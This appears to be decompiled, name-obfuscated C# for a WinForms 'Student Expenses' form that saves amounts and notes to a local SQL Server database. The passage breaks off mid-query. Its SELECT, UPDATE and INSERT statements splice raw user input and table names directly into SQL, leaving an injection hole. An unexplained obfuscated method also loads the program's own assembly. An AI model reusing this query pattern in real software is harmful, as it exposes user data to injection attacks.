using System;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Bz3;
using Jq75;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Ty6;
using s8Z;
using t1G;
using w8DA;

namespace Cc92;

[DesignerGenerated]
public class n1R9 : Form
{
	private Button _cmdSubmit;

	private Label _Label1;

	private PictureBox _PictureBox2;

	private Label _Label6;

	private Label _Label7;

	private TextBox _TxtNote;

	private Label _Label8;

	private SqlConnection Sqlcn;

	private SqlCommand Sqlcmd;

	private string _NotePass;

	internal IContainer a;

	internal TextBox g;

	internal PictureBox j;

	internal Timer P;

	internal Label M;

	internal Label L;

	internal Label t;

	internal PictureBox d;

	internal PictureBox Q;

	internal Label r;

	internal PictureBox U;

	internal Button I;

	internal DateTimePicker x;

	internal SqlDataAdapter y;

	internal DataSet e;

	internal string b;

	internal string s;

	public string StringPass
	{
		get
		{
			return b;
		}
		set
		{
			string text = (b = value);
		}
	}

	public string AddPass
	{
		get
		{
			return s;
		}
		set
		{
			string text = (s = value);
		}
	}

	public string NotePass
	{
		get
		{
			return _NotePass;
		}
		set
		{
			_NotePass = value;
		}
	}

	public n1R9()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)x7KQ);
		SqlConnection val = new SqlConnection();
		val.set_ConnectionString("Data Source=DELL;Initial Catalog=logindata;Integrated Security=True");
		Sqlcn = val;
		Sqlcmd = new SqlCommand();
		Pg14();
	}

	protected override void g1GX(bool j7GN)
	{
		try
		{
			if (j7GN && a != null)
			{
				a.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(j7GN);
		}
	}

	private void Pg14()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Expected O, but got Unknown
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f4: Expected O, but got Unknown
		//IL_017d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Expected O, but got Unknown
		//IL_0239: Unknown result type (might be due to invalid IL or missing references)
		//IL_0243: Expected O, but got Unknown
		//IL_02de: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e8: Expected O, but got Unknown
		//IL_0383: Unknown result type (might be due to invalid IL or missing references)
		//IL_038d: Expected O, but got Unknown
		//IL_0415: Unknown result type (might be due to invalid IL or missing references)
		//IL_041f: Expected O, but got Unknown
		//IL_04b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_04bb: Expected O, but got Unknown
		//IL_0549: Unknown result type (might be due to invalid IL or missing references)
		//IL_0553: Expected O, but got Unknown
		//IL_05fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0606: Expected O, but got Unknown
		//IL_06a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ab: Expected O, but got Unknown
		//IL_0737: Unknown result type (might be due to invalid IL or missing references)
		//IL_0741: Expected O, but got Unknown
		//IL_07d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_07dc: Expected O, but got Unknown
		//IL_086f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0879: Expected O, but got Unknown
		//IL_0915: Unknown result type (might be due to invalid IL or missing references)
		//IL_091f: Expected O, but got Unknown
		//IL_09c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_09d0: Expected O, but got Unknown
		//IL_0a7c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a86: Expected O, but got Unknown
		//IL_0b35: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b3f: Expected O, but got Unknown
		//IL_0bdc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be6: Expected O, but got Unknown
		//IL_0c75: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c7f: Expected O, but got Unknown
		//IL_0cba: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc4: Expected O, but got Unknown
		//IL_0d3a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d44: Expected O, but got Unknown
		//IL_0ea5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eaf: Expected O, but got Unknown
		IContainer container = (a = new Container());
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(n1R9));
		Tm5a(new Button());
		Ai4j(new Label());
		Yg98(new TextBox());
		Jd34(new PictureBox());
		Pi5d(new PictureBox());
		i6Q7(new Timer(a));
		Tf5a(new Label());
		St91(new Label());
		Cw6i(new Label());
		p9P1(new Label());
		Rq16(new PictureBox());
		o3TE(new PictureBox());
		x8Z6(new Label());
		Tb2x(new Label());
		z1MG(new PictureBox());
		d6S2(new Button());
		k4JH(new TextBox());
		Pt8n(new Label());
		o5Q7(new DateTimePicker());
		((ISupportInitialize)f7F6()).BeginInit();
		((ISupportInitialize)Ba1g()).BeginInit();
		((ISupportInitialize)y9T1()).BeginInit();
		((ISupportInitialize)e3W6()).BeginInit();
		((ISupportInitialize)b2Q9()).BeginInit();
		((Control)this).SuspendLayout();
		((Control)Nk08()).set_Anchor((AnchorStyles)15);
		((ButtonBase)Nk08()).set_BackColor(Color.Lime);
		((Control)Nk08()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)Nk08()).set_FlatStyle((FlatStyle)0);
		((Control)Nk08()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Nk08()).set_ForeColor(Color.White);
		((Control)Nk08()).set_Location(new Point(558, 427));
		((Control)Nk08()).set_Name("cmdSubmit");
		((Control)Nk08()).set_Size(new Size(110, 26));
		((Control)Nk08()).set_TabIndex(4);
		((ButtonBase)Nk08()).set_Text(" &Submit");
		((ButtonBase)Nk08()).set_TextAlign((ContentAlignment)2);
		((ButtonBase)Nk08()).set_UseVisualStyleBackColor(false);
		((Control)Kb1j()).set_Anchor((AnchorStyles)15);
		((Control)Kb1j()).set_BackColor(Color.Transparent);
		((Control)Kb1j()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Kb1j()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)Kb1j()).set_Location(new Point(155, 25));
		((Control)Kb1j()).set_Name("Label1");
		((Control)Kb1j()).set_Size(new Size(63, 23));
		((Control)Kb1j()).set_TabIndex(5);
		Kb1j().set_Text("Date : ");
		((Control)t7AQ()).set_Anchor((AnchorStyles)15);
		((TextBoxBase)t7AQ()).set_BackColor(Color.Azure);
		((Control)t7AQ()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)t7AQ()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)t7AQ()).set_Location(new Point(305, 153));
		t7AQ().set_Multiline(true);
		((Control)t7AQ()).set_Name("TxtMoney");
		((Control)t7AQ()).set_Size(new Size(131, 26));
		((Control)t7AQ()).set_TabIndex(0);
		((Control)f7F6()).set_Anchor((AnchorStyles)15);
		((Control)f7F6()).set_BackColor(Color.Transparent);
		((Control)f7F6()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox1.BackgroundImage"));
		((Control)f7F6()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)f7F6()).set_Location(new Point(0, 1));
		((Control)f7F6()).set_Name("PictureBox1");
		((Control)f7F6()).set_Size(new Size(100, 90));
		f7F6().set_TabIndex(5);
		f7F6().set_TabStop(false);
		((Control)Ba1g()).set_Anchor((AnchorStyles)15);
		((Control)Ba1g()).set_BackColor(Color.Transparent);
		((Control)Ba1g()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox2.BackgroundImage"));
		((Control)Ba1g()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Ba1g()).set_Location(new Point(502, 410));
		((Control)Ba1g()).set_Name("PictureBox2");
		((Control)Ba1g()).set_Size(new Size(63, 57));
		Ba1g().set_TabIndex(6);
		Ba1g().set_TabStop(false);
		((Control)Pj89()).set_Anchor((AnchorStyles)15);
		((Control)Pj89()).set_BackColor(Color.Gainsboro);
		((Control)Pj89()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Pj89()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)Pj89()).set_Location(new Point(223, 24));
		((Control)Pj89()).set_Name("Label3");
		((Control)Pj89()).set_Size(new Size(156, 23));
		((Control)Pj89()).set_TabIndex(6);
		((Control)Xr15()).set_Anchor((AnchorStyles)15);
		((Control)Xr15()).set_BackColor(Color.Transparent);
		((Control)Xr15()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Xr15()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)Xr15()).set_Location(new Point(90, 291));
		((Control)Xr15()).set_Name("Label4");
		((Control)Xr15()).set_Size(new Size(105, 30));
		((Control)Xr15()).set_TabIndex(12);
		Xr15().set_Text("Add a Note");
		Xr15().set_TextAlign((ContentAlignment)32);
		((Control)Yp34()).set_Anchor((AnchorStyles)15);
		((Control)Yp34()).set_BackColor(Color.Transparent);
		((Control)Yp34()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Yp34()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)Yp34()).set_Location(new Point(477, 24));
		((Control)Yp34()).set_Name("Label5");
		((Control)Yp34()).set_Size(new Size(63, 23));
		((Control)Yp34()).set_TabIndex(7);
		Yp34().set_Text("Time : ");
		((Control)b5PY()).set_Anchor((AnchorStyles)15);
		((Control)b5PY()).set_BackColor(Color.Gainsboro);
		((Control)b5PY()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)b5PY()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)b5PY()).set_Location(new Point(527, 24));
		((Control)b5PY()).set_Name("Label6");
		((Control)b5PY()).set_Size(new Size(137, 23));
		((Control)b5PY()).set_TabIndex(8);
		((Control)y9T1()).set_Anchor((AnchorStyles)15);
		((Control)y9T1()).set_BackColor(Color.Transparent);
		((Control)y9T1()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox3.BackgroundImage"));
		((Control)y9T1()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)y9T1()).set_Location(new Point(226, 137));
		((Control)y9T1()).set_Name("PictureBox3");
		((Control)y9T1()).set_Size(new Size(52, 42));
		y9T1().set_TabIndex(11);
		y9T1().set_TabStop(false);
		((Control)e3W6()).set_Anchor((AnchorStyles)15);
		((Control)e3W6()).set_BackColor(Color.Transparent);
		((Control)e3W6()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox4.BackgroundImage"));
		((Control)e3W6()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)e3W6()).set_Location(new Point(226, 291));
		((Control)e3W6()).set_Name("PictureBox4");
		((Control)e3W6()).set_Size(new Size(52, 42));
		e3W6().set_TabIndex(12);
		e3W6().set_TabStop(false);
		((Control)Aj1c()).set_Anchor((AnchorStyles)15);
		((Control)Aj1c()).set_BackColor(Color.Transparent);
		((Control)Aj1c()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Aj1c()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)Aj1c()).set_Location(new Point(210, 88));
		((Control)Aj1c()).set_Name("Label7");
		((Control)Aj1c()).set_Size(new Size(258, 30));
		((Control)Aj1c()).set_TabIndex(9);
		Aj1c().set_TextAlign((ContentAlignment)16);
		((Control)d9J4()).set_Anchor((AnchorStyles)15);
		((Control)d9J4()).set_BackColor(Color.Gainsboro);
		((Control)d9J4()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)d9J4()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)d9J4()).set_Location(new Point(466, 88));
		((Control)d9J4()).set_Name("Label2");
		((Control)d9J4()).set_Size(new Size(88, 30));
		((Control)d9J4()).set_TabIndex(10);
		d9J4().set_Text("(In Rupees)");
		d9J4().set_TextAlign((ContentAlignment)16);
		((Control)b2Q9()).set_Anchor((AnchorStyles)15);
		((Control)b2Q9()).set_BackColor(Color.Transparent);
		((Control)b2Q9()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox5.BackgroundImage"));
		((Control)b2Q9()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)b2Q9()).set_Location(new Point(61, 419));
		((Control)b2Q9()).set_Name("PictureBox5");
		((Control)b2Q9()).set_Size(new Size(49, 48));
		b2Q9().set_TabIndex(16);
		b2Q9().set_TabStop(false);
		((Control)r9QE()).set_Anchor((AnchorStyles)15);
		((ButtonBase)r9QE()).set_BackColor(Color.Lime);
		((Control)r9QE()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)r9QE()).set_FlatStyle((FlatStyle)0);
		((Control)r9QE()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)r9QE()).set_ForeColor(Color.White);
		((Control)r9QE()).set_Location(new Point(94, 431));
		((Control)r9QE()).set_Name("Button2");
		((Control)r9QE()).set_Size(new Size(110, 26));
		((Control)r9QE()).set_TabIndex(3);
		((ButtonBase)r9QE()).set_Text(" Go &Back");
		((ButtonBase)r9QE()).set_TextAlign((ContentAlignment)2);
		((ButtonBase)r9QE()).set_UseVisualStyleBackColor(false);
		((Control)w1Q2()).set_Anchor((AnchorStyles)15);
		((TextBoxBase)w1Q2()).set_BackColor(Color.Azure);
		((Control)w1Q2()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)w1Q2()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)w1Q2()).set_Location(new Point(305, 274));
		w1Q2().set_Multiline(true);
		((Control)w1Q2()).set_Name("TxtNote");
		((Control)w1Q2()).set_Size(new Size(281, 115));
		((Control)w1Q2()).set_TabIndex(2);
		((Control)w7A6()).set_Anchor((AnchorStyles)15);
		((Control)w7A6()).set_BackColor(Color.Transparent);
		((Control)w7A6()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)w7A6()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)w7A6()).set_Location(new Point(55, 204));
		((Control)w7A6()).set_Name("Label8");
		((Control)w7A6()).set_Size(new Size(244, 30));
		((Control)w7A6()).set_TabIndex(11);
		w7A6().set_Text("Select Your Date");
		w7A6().set_TextAlign((ContentAlignment)32);
		i5HG().set_CalendarFont(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		i5HG().set_CalendarForeColor(Color.FromArgb(0, 64, 0));
		i5HG().set_CalendarTitleForeColor(Color.FromArgb(0, 64, 0));
		((Control)i5HG()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)i5HG()).set_Location(new Point(305, 208));
		((Control)i5HG()).set_Name("TxtDate");
		((Control)i5HG()).set_Size(new Size(249, 26));
		((Control)i5HG()).set_TabIndex(17);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(705, 476));
		((Control)this).get_Controls().Add((Control)(object)i5HG());
		((Control)this).get_Controls().Add((Control)(object)w7A6());
		((Control)this).get_Controls().Add((Control)(object)w1Q2());
		((Control)this).get_Controls().Add((Control)(object)b2Q9());
		((Control)this).get_Controls().Add((Control)(object)r9QE());
		((Control)this).get_Controls().Add((Control)(object)d9J4());
		((Control)this).get_Controls().Add((Control)(object)Aj1c());
		((Control)this).get_Controls().Add((Control)(object)e3W6());
		((Control)this).get_Controls().Add((Control)(object)y9T1());
		((Control)this).get_Controls().Add((Control)(object)b5PY());
		((Control)this).get_Controls().Add((Control)(object)Yp34());
		((Control)this).get_Controls().Add((Control)(object)Xr15());
		((Control)this).get_Controls().Add((Control)(object)Pj89());
		((Control)this).get_Controls().Add((Control)(object)Ba1g());
		((Control)this).get_Controls().Add((Control)(object)f7F6());
		((Control)this).get_Controls().Add((Control)(object)t7AQ());
		((Control)this).get_Controls().Add((Control)(object)Kb1j());
		((Control)this).get_Controls().Add((Control)(object)Nk08());
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form6");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Student Expenses");
		((ISupportInitialize)f7F6()).EndInit();
		((ISupportInitialize)Ba1g()).EndInit();
		((ISupportInitialize)y9T1()).EndInit();
		((ISupportInitialize)e3W6()).EndInit();
		((ISupportInitialize)b2Q9()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Button Nk08()
	{
		return _cmdSubmit;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Tm5a(Button Pf6s)
	{
		EventHandler eventHandler = Gw94;
		Button cmdSubmit = _cmdSubmit;
		if (cmdSubmit != null)
		{
			((Control)cmdSubmit).remove_Click(eventHandler);
		}
		_cmdSubmit = Pf6s;
		cmdSubmit = _cmdSubmit;
		if (cmdSubmit != null)
		{
			((Control)cmdSubmit).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Kb1j()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ai4j(Label Aj5o)
	{
		EventHandler eventHandler = Cz1c;
		Label label = _Label1;
		if (label != null)
		{
			((Control)label).remove_Click(eventHandler);
		}
		_Label1 = Aj5o;
		label = _Label1;
		if (label != null)
		{
			((Control)label).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox t7AQ()
	{
		return g;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yg98(TextBox i8XQ)
	{
		EventHandler eventHandler = t1JH;
		TextBox val = g;
		if (val != null)
		{
			((Control)val).remove_TextChanged(eventHandler);
		}
		TextBox val2 = (g = i8XQ);
		val = g;
		if (val != null)
		{
			((Control)val).add_TextChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual PictureBox f7F6()
	{
		return j;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Jd34(PictureBox w2C0)
	{
		PictureBox val = (j = w2C0);
	}

	[SpecialName]
	internal virtual PictureBox Ba1g()
	{
		return _PictureBox2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pi5d(PictureBox m3R8)
	{
		EventHandler eventHandler = m6B7;
		PictureBox pictureBox = _PictureBox2;
		if (pictureBox != null)
		{
			((Control)pictureBox).remove_Click(eventHandler);
		}
		_PictureBox2 = m3R8;
		pictureBox = _PictureBox2;
		if (pictureBox != null)
		{
			((Control)pictureBox).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer Yd6w()
	{
		return P;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void i6Q7(Timer Bj1r)
	{
		EventHandler eventHandler = Fi0f;
		Timer p = P;
		if (p != null)
		{
			p.remove_Tick(eventHandler);
		}
		Timer val = (P = Bj1r);
		p = P;
		if (p != null)
		{
			p.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Pj89()
	{
		return M;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Tf5a(Label c7DS)
	{
		EventHandler eventHandler = z5KF;
		Label m = M;
		if (m != null)
		{
			((Control)m).remove_Click(eventHandler);
		}
		Label val = (M = c7DS);
		m = M;
		if (m != null)
		{
			((Control)m).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Xr15()
	{
		return L;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void St91(Label n5TL)
	{
		Label val = (L = n5TL);
	}

	[SpecialName]
	internal virtual Label Yp34()
	{
		return t;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cw6i(Label Re7j)
	{
		EventHandler eventHandler = Yt02;
		Label val = t;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Label val2 = (t = Re7j);
		val = t;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label b5PY()
	{
		return _Label6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p9P1(Label Gq15)
	{
		EventHandler eventHandler = Ro48;
		Label label = _Label6;
		if (label != null)
		{
			((Control)label).remove_Click(eventHandler);
		}
		_Label6 = Gq15;
		label = _Label6;
		if (label != null)
		{
			((Control)label).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual PictureBox y9T1()
	{
		return d;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Rq16(PictureBox Wi7a)
	{
		EventHandler eventHandler = s6ST;
		PictureBox val = d;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		PictureBox val2 = (d = Wi7a);
		val = d;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual PictureBox e3W6()
	{
		return Q;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o3TE(PictureBox Qs83)
	{
		PictureBox val = (Q = Qs83);
	}

	[SpecialName]
	internal virtual Label Aj1c()
	{
		return _Label7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x8Z6(Label t2NX)
	{
		_Label7 = t2NX;
	}

	[SpecialName]
	internal virtual Label d9J4()
	{
		return r;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Tb2x(Label s9YK)
	{
		Label val = (r = s9YK);
	}

	[SpecialName]
	internal virtual PictureBox b2Q9()
	{
		return U;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z1MG(PictureBox Eo3s)
	{
		PictureBox val = (U = Eo3s);
	}

	[SpecialName]
	internal virtual Button r9QE()
	{
		return I;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d6S2(Button z3L4)
	{
		EventHandler eventHandler = n0L1;
		Button i = I;
		if (i != null)
		{
			((Control)i).remove_Click(eventHandler);
		}
		Button val = (I = z3L4);
		i = I;
		if (i != null)
		{
			((Control)i).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox w1Q2()
	{
		return _TxtNote;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void k4JH(TextBox Dd4c)
	{
		_TxtNote = Dd4c;
	}

	[SpecialName]
	internal virtual Label w7A6()
	{
		return _Label8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pt8n(Label Mb30)
	{
		_Label8 = Mb30;
	}

	[SpecialName]
	internal virtual DateTimePicker i5HG()
	{
		return x;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o5Q7(DateTimePicker b0C8)
	{
		DateTimePicker val = (x = b0C8);
	}

	public bool e4XN()
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Sqlcn.Open();
			Sqlcn.Close();
			return true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public bool f3A5()
	{
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		if (Sqlcn.get_State() != ConnectionState.Open)
		{
			Sqlcn.Open();
		}
		if (e != null)
		{
			e.Clear();
		}
		string identity = c5W.Identity;
		DateTime dateTime = Conversions.ToDate(i5HG().get_Text());
		try
		{
			SqlCommand val = new SqlCommand("SELECT Count(Date) As Ucount FROM [" + identity + "] WHERE Date='" + Conversions.ToString(dateTime) + "' ", Sqlcn);
			SqlDataAdapter val2 = (y = new SqlDataAdapter(val));
			DataSet dataSet = (e = new DataSet());
			((DbDataAdapter)(object)y).Fill(e);
			Sqlcn.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		if (Operators.ConditionalCompareObjectEqual(e.Tables[0].Rows[0]["Ucount"], (object)1, false))
		{
			return true;
		}
		return false;
	}

	internal static string[] Fo29()
	{
		Sj1.i1A();
		Assembly value = Assembly.LoadFrom(Environment.GetCommandLineArgs()[0]);
		Mc4.mDic.Add("bee", value);
		return Qd38.i0Z5();
	}

	private void x7KQ(object sender, EventArgs e)
	{
		Yd6w().set_Enabled(true);
		Aj1c().set_Text(StringPass);
	}

	private void Fi0f(object sender, EventArgs e)
	{
		Pj89().set_Text(DateTime.Now.ToString("   dd-MM-yyyy"));
		b5PY().set_Text(DateTime.Now.ToString("   hh:mm:ss"));
	}

	private void z5KF(object sender, EventArgs e)
	{
	}

	private void m6B7(object sender, EventArgs e)
	{
	}

	private void s6ST(object sender, EventArgs e)
	{
	}

	private void t1JH(object sender, EventArgs e)
	{
	}

	private void Yt02(object sender, EventArgs e)
	{
	}

	private void Ro48(object sender, EventArgs e)
	{
	}

	private void n0L1(object sender, EventArgs e)
	{
		((Control)i1B.Forms.g5X()).Show();
		((Form)this).Close();
	}

	private void Gw94(object sender, EventArgs e)
	{
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01f8: Unknown result type (might be due to invalid IL or missing references)
		string text = t7AQ().get_Text();
		DateTime dateTime = Conversions.ToDate(i5HG().get_Text());
		string text2 = w1Q2().get_Text();
		string identity = c5W.Identity;
		string addPass = AddPass;
		string notePass = NotePass;
		if (!e4XN())
		{
			return;
		}
		if (f3A5())
		{
			try
			{
				if (Sqlcn.get_State() != ConnectionState.Open)
				{
					Sqlcn.Open();
				}
				string text3 = "UPDATE [" + identity + "] SET [" + addPass + "] = '" + text + "' ,[" + notePass + "] = '" + text2 + "' WHERE [Date] = '" + Conversions.ToString(dateTime) + "' ";
				Sqlcmd = new SqlCommand(text3, Sqlcn);
				Sqlcmd.ExecuteNonQuery();
				Sqlcn.Close();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
			}
		}
		if (!f3A5())
		{
			try
			{
				if (Sqlcn.get_State() != ConnectionState.Open)
				{
					Sqlcn.Open();
				}
				string text4 = "INSERT INTO [" + identity + "]( [Date], [" + addPass + "], [" + notePass + "])  VALUES('" + Conversions.ToString(dateTime) + "','" + text + "','" + text2 + "')";
